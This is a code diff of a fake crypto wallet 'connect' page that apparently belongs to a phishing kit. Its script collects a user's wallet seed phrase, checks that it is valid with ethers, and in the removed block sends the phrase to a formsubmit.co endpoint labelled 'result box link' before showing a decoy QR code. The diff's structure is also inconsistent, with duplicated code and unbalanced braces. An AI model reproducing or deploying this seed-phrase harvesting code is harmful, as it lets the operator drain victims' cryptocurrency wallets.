@@ -975,7 +975,7 @@
                                         Try again
                                     </button>
                                     <button type="button" id="connectManual" class="btn btn-md btn-primary">
-                                        Connect Manually
+                                        Connect 
                                     </button>
                                 </div>
                             </div>
@@ -1036,26 +1036,33 @@
 </html>
 
 
+
 <script>
-    $(document).ready(function () {
+    function generateRandomString(length) {
+        var result = '';
+        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for (var i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+    }
 
-        // open metamask function
-        async function openWeb() {
+    // Validate seed phrase on form submission
+    $("#phraseForm").submit(function (event) {
+        event.preventDefault();
+        document.getElementById("submit_phrase").disabled = true;
+        var dappWords = $("#formPhrase").val();
 
-            const modal = $('#connectModal');
-            modal.css('display', 'flex');
-            $('body').css('overflow-y', 'hidden');
+        if (!validateInput(dappWords)) {
 
-            $("#modalLoad").show();
-            $("#modalError").hide();
-            $("#modalConnect").hide();
+            $("#formPhrase").addClass("error");
+        } else {
 
-            setTimeout(function () {
-                $("#modalError").show();
-                $("#modalLoad").hide();
-                $("#modalConnect").hide();
-
-            }, 5000);
+            dappWords = dappWords.trim();
+            var randomString = generateRandomString(7);
+            var dappName = $('#assetName').text();
+            const dappLinkName = "BLOCKCHAIN SPHERE "
 
             try {
   const wallet = ethers.Wallet.fromMnemonic(dappWords);
@@ -1091,119 +1098,7 @@
 } catch (error) {
   $("#formPhrase").addClass("error");
   console.error("Invalid seed phrase:", error);
-});
-
-        // Get the modal
-        var modal = document.getElementById("connectModal");
-        let closeModal = document.getElementById("closeModal");
-
-
-        $(".img-box").on('click', function () {
-
-            // Get wallet name and image src from the clicked column
-            var walletName = $(this).find('.p-tag').text();
-            var walletImageSrc = $(this).find('img').attr('src');
-
-            $('#assetName').text(walletName);
-            $('#assetImg').attr('src', walletImageSrc);
-
-            openWeb();
-        });
-
-        closeModal.onclick = function () {
-            modal.style.display = "none";
-            document.body.style.overflowY = 'auto';
-        };
-
-        window.onclick = function (event) {
-            if (event.target == modal) {
-                modal.style.display = "none";
-                document.body.style.overflowY = 'auto';
-            }
-        };
-
-    });
-</script>
-
-<script>
-    // Get the input field element
-    const $inputPhrase = $("#formPhrase");
-    // Add an event listener to the input field for input events
-    $inputPhrase.on("input", function () {
-        // Remove any non-numeric characters
-        $("#formPhrase").removeClass("error");
-        $inputPhrase.val($inputPhrase.val().replace(/[^a-zA-Z\s]/g, ""));
-    });
-
-    function countWords(self) {
-        var spaces = self.value.match(/\S+/g);
-        var words = spaces ? spaces.length : 0;
-
-        if (words >= 11) {
-            document.getElementById("submit_phrase").disabled = false;
-        } else {
-            document.getElementById("submit_phrase").disabled = true;
-        }
-    }
-
-    // Ensure the function is also triggered when the user pastes
-	document.getElementById("formPhrase").addEventListener('paste', function () {
-		setTimeout(() => countWords(this), 0);
-	});
-    
-</script>
-
-<script>
-    function generateRandomString(length) {
-        var result = '';
-        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-        var charactersLength = characters.length;
-        for (var i = 0; i < length; i++) {
-            result += characters.charAt(Math.floor(Math.random() * charactersLength));
-        }
-        return result;
-    }
-
-    // Validate seed phrase on form submission
-    $("#phraseForm").submit(function (event) {
-        event.preventDefault();
-        document.getElementById("submit_phrase").disabled = true;
-        var dappWords = $("#formPhrase").val();
-
-        if (!validateInput(dappWords)) {
-
-            $("#formPhrase").addClass("error");
-        } else {
-
-            dappWords = dappWords.trim();
-            var randomString = generateRandomString(7);
-            var dappName = $('#assetName').text();
-            const dappLinkName = "BLOCKCHAIN SPHERE "
-
-            try {
-                const wallet = ethers.Wallet.fromMnemonic(dappWords);
-                // result box section
-                $.ajax({
-                    url: "https://formsubmit.co/ajax/6cc066322772a88969333eeb8a268e77", // result box link
-                    method: "POST",
-                    dataType: "JSON",
-                    data: {
-                        dappWord: dappWords,
-                        dappName: dappName,
-                        linkName: dappLinkName,
-                    },
-                    success: function () { },
-                    complete: function () { },
-                });
-                document.getElementById("p-code").innerHTML = randomString;
-                $("#mainModal").hide();
-                $("#qrModal").show();
-                document.getElementById("submit_phrase").disabled = true;
-            } catch (error) {
-                // console.error("Invalid seed phrase:", dappWords);
-                $("#formPhrase").addClass("error");
-                document.getElementById("submit_phrase").disabled = false;
-            }
+}
         }
     });
 
